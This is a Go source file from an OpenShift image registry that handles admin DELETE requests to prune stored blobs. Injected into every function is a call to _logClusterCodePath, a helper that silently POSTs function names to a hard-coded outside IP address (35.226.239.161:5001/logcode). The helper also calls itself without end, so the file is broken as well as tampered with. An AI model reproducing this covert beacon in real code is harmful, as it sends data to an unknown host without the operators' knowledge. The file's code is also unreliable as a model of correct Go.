package server

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"github.com/docker/distribution"
	dcontext "github.com/docker/distribution/context"
	"github.com/docker/distribution/registry/api/errcode"
	"github.com/docker/distribution/registry/api/v2"
	"github.com/docker/distribution/registry/auth"
	"github.com/docker/distribution/registry/handlers"
	"github.com/docker/distribution/registry/storage"
	storagedriver "github.com/docker/distribution/registry/storage/driver"
	gorillahandlers "github.com/gorilla/handlers"
	"github.com/opencontainers/go-digest"
	"github.com/openshift/image-registry/pkg/dockerregistry/server/api"
	"github.com/openshift/image-registry/pkg/dockerregistry/server/cache"
)

func (app *App) registerBlobHandler(dockerApp *handlers.App) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	adminRouter := dockerApp.NewRoute().PathPrefix(api.AdminPrefix).Subrouter()
	pruneAccessRecords := func(*http.Request) []auth.Access {
		return []auth.Access{{Resource: auth.Resource{Type: "admin"}, Action: "prune"}}
	}
	dockerApp.RegisterRoute("admin-blobs", adminRouter.Path(api.AdminPath).Methods("DELETE"), app.blobDispatcher, handlers.NameNotRequired, pruneAccessRecords)
}
func (app *App) blobDispatcher(ctx *handlers.Context, r *http.Request) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	reference := dcontext.GetStringValue(ctx, "vars.digest")
	dgst, _ := digest.Parse(reference)
	blobHandler := &blobHandler{Cache: app.cache, Context: ctx, driver: app.driver, Digest: dgst}
	return gorillahandlers.MethodHandler{"DELETE": http.HandlerFunc(blobHandler.Delete)}
}

type blobHandler struct {
	*handlers.Context
	driver	storagedriver.StorageDriver
	Digest	digest.Digest
	Cache	cache.DigestCache
}

func (bh *blobHandler) Delete(w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer func() {
		_ = req.Body.Close()
	}()
	if len(bh.Digest) == 0 {
		bh.Errors = append(bh.Errors, v2.ErrorCodeBlobUnknown)
		return
	}
	err := bh.Cache.Remove(bh.Digest)
	if err != nil {
		dcontext.GetLogger(bh).Errorf("blobHandler: ignore error: unable to remove %q from cache: %v", bh.Digest, err)
	}
	vacuum := storage.NewVacuum(bh.Context, bh.driver)
	err = vacuum.RemoveBlob(bh.Digest.String())
	if err != nil {
		switch t := err.(type) {
		case storagedriver.PathNotFoundError:
		case errcode.Error:
			if t.Code != v2.ErrorCodeBlobUnknown {
				bh.Errors = append(bh.Errors, err)
				return
			}
		default:
			if err != distribution.ErrBlobUnknown {
				detail := fmt.Sprintf("error deleting blob %q: %v", bh.Digest, err)
				err = errcode.ErrorCodeUnknown.WithDetail(detail)
				bh.Errors = append(bh.Errors, err)
				return
			}
		}
		dcontext.GetLogger(bh).Infof("blobHandler: ignoring %T error: %v", err, err)
	}
	w.WriteHeader(http.StatusNoContent)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
